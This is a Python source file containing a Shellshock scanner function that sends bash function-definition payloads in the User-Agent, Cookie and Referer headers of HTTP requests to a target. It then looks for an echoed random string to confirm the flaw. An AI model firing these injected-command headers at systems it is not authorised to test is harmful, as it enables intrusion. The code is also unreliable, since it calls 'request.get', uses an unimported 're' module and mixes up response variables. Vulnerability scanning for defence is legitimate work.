import requests 
import time 
from  random import Random
import string


def shellshock_scanner(target , verbose = False , mod = print , logger = None) :
	mod(' [*] Parsing strings...')
	time.sleep(0.5)
	r_str = ''.join(Random().sample(string.ascii_letters, 30))
	mod(' [*] Configuring payloads...')
	con = '() { :;}; echo; echo; echo %s'%(r_str)
	cmd = "() { test;};/bin/nopatchobfu"
	headers = {'User-agent': cmd}
	time.sleep(0.5)
	mod(' [*] Making no-verify request...')
	time.sleep(1)
	try : 
		r = requests.get(target, headers=headers, verify=False)
		if r.status_code == 500 or r.status_code == 502:
			mod(' [+] The website seems Vulnerable to Shellshock...')
			time.sleep(0.5)
			mod(' [*] Confirming the vulnerability...')

			headers = {
						'User-Agent' : con,
						'Cookie'	 : con,
						'Referer'	: con
					}

			resp = request.get(target, headers=headers, verify=False)
			if resp.status_code == 200:
				if re.search(r_str,resp.content,re.I):
					mod(' [+] ShellShock was found in: %s'%(resp.url))

			elif r.status_code:
				mod(' [-] 2nd phase of detection does not reveal vulnerability...')
				mod(' [!] Please check manually...')
		else:
			mod(' [-] The web seems immune to shellshock...')
	except Exception as e : 
		mod('An Exception Raised : ' ,  e )